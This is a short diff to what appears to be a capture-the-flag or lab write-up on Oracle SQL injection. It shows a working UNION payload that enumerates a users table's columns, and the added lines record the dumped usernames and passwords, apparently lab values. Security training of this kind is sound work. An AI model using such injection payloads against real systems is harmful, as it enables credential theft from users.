@@ -32,5 +32,18 @@ Table name `USERS_YXUZFJ`
 `Pets' union select COLUMN_NAME,null from all_tab_columns where table_name='USERS_YXUZFJ'--`
 Columns:
 
+```
 PASSWORD_ODOKFU  
 USERNAME_DZRUHS
+```
+
+```
+administrator
+b33a0q24met5szk298fj
+
+carlos
+yutk3v2n7a8tt6wco6n2
+
+wiener
+95ca28n08tuaahvqbeef
+```
